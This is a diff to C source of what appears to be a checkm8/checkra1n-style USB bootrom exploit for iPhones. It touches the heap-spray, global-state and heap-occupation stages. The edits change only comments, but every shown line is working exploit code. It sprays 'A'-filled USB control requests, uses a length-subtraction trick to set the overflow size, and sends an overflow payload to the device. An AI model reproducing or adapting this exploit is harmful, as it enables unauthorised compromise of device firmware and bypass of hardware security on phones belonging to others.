@@ -39,8 +39,8 @@ static void heap_spray(io_client_t client)
     DEBUGLOG("[%s] (1/7) %x", __FUNCTION__, result.ret);
     usleep(1000);
     
-    // For iOS devices (especially older ones)
-    // Repeat forever until usb_ctrl_transfer(0x80,6,0x304,0x40a,blank,64) reaches Timeout
+    // for iphoneos devices (especially older ones)
+    // repeat forever until usb_req_leak() reaches timeout
     int i=0;
     for(i=0;i<16384;i++){
         wLen = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
@@ -77,12 +77,12 @@ static void set_global_state(io_client_t client)
     
     memset(&blank, '\x41', 2048);
     
-    val = 1408; // t8010 & t8015 & s5l8960x
+    val = 1408; // A7/A9X/A10/A10X/A11
     
     /* val haxx
-     * If async_transfer() sent = 0x40, then val = 1408. And, it is possible to try again a few times and wait until sent = 0x40
-     * However, even if sent != 0x40, it succeeds by subtracting the value from val.
-     * To reduce the number of attempts, It decided to use subtraction unless sent is greater than val.
+     * If async_transfer sent size = 64 byte, then pushval size = 1408 byte. And, it is possible to try again a few times and wait until sent = 64
+     * However, even if sent != 64, it succeeds by subtracting the value from pushval.
+     * add 64 byte from pushval, then subtract sent from it.
      */
     
     int i=0;
@@ -90,14 +90,13 @@ static void set_global_state(io_client_t client)
         i++;
         DEBUGLOG("[%s] (*) retry: %x", __FUNCTION__, i);
         usleep(10000);
-        result = send_data(client, blank, 64);
+        result = send_data(client, blank, 64); // send blank data and redo the request.
         DEBUGLOG("[%s] (*) %x", __FUNCTION__, result.ret);
         usleep(10000);
     }
     
     val += 0x40;
     val -= sent;
-    
     DEBUGLOG("[%s] (1/3) sent: %x, val: %x", __FUNCTION__, (unsigned int)sent, val);
     
     result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
@@ -123,7 +122,7 @@ static void heap_occupation(io_client_t client, checkra1n_payload_t payload)
     DEBUGLOG("[%s] (2/6) %x", __FUNCTION__, result.ret);
     usleep(10000);
     
-    memset(&blank, '\x41', 2048); // AAAA
+    memset(&blank, '\x41', 2048); // 'A'
     
     result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over1, payload.over1_len, 100);
     DEBUGLOG("[%s] (3/6) %x", __FUNCTION__, result.ret);
